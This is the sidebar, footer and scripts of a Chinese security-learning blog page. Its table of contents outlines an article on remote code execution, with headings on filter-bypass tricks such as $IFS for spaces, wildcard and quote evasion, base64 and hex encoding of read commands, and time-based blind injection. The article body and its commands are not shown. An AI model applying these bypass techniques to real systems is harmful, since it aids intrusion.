onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3"><span class="toc-text">RCE（远程代码执行漏洞）原理及漏洞相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">空格过滤绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7-%EF%BC%9A"><span class="toc-text">大括号{}：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%EF%BC%9A"><span class="toc-text">$IFS代替空格：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="toc-text">重定向字符&lt;，&lt;&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">文件名过滤绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">??,*绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E2%80%98-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E2%80%9C%E2%80%9D-%E5%8F%8D%E5%BC%95%E5%8F%B7-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="toc-text">单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0-%E7%BB%95%E8%BF%87"><span class="toc-text">反斜杠\绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%EF%BC%9A-1%E5%88%B0-9%E3%80%81-%E5%92%8C"><span class="toc-text">特殊变量：$1到$9、$@和$*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%88%E9%80%9A%E8%BF%87%E8%B5%8B%E5%80%BC%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">内联执行绕过（通过赋值绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">利用linux中的环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">常见文件读取命令绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%EF%BC%9A"><span class="toc-text">base64编码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base32%E7%BC%96%E7%A0%81%E5%90%8C%E7%90%86"><span class="toc-text">base32编码同理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HEX%E7%BC%96%E7%A0%81%EF%BC%88ASCII%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-text">HEX编码（ASCII编码）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC"><span class="toc-text">python脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxd-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%98%BE%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E5%B7%A5%E5%85%B7%E3%80%82"><span class="toc-text">xxd: 二进制显示和处理文件工具。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E7%BC%96%E7%A0%81%EF%BC%8816%E8%BF%9B%E5%88%B6%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81%EF%BC%89"><span class="toc-text">shellcode编码（16进制的机器码）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E8%A2%AB%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">读取命令被绕过：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-text">无回显时间盲注：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/" title="2025春秋杯冬季赛">2025春秋杯冬季赛</a><time datetime="2025-01-21T13:31:32.000Z" title="发表于 2025-01-21 21:31:32">2025-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/21/RCE/" title="RCE">RCE</a><time datetime="2025-01-21T13:29:33.000Z" title="发表于 2025-01-21 21:29:33">2025-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">文件包含</a><time datetime="2025-01-10T06:16:20.000Z" title="发表于 2025-01-10 14:16:20">2025-01-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/" title="智能合约深度学习（持续施工ing）">智能合约深度学习（持续施工ing）</a><time datetime="2024-12-22T08:03:30.000Z" title="发表于 2024-12-22 16:03:30">2024-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="BUU—MISC刷题记录">BUU—MISC刷题记录</a><time datetime="2024-12-20T07:37:44.000Z" title="发表于 2024-12-20 15:37:44">2024-12-20</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
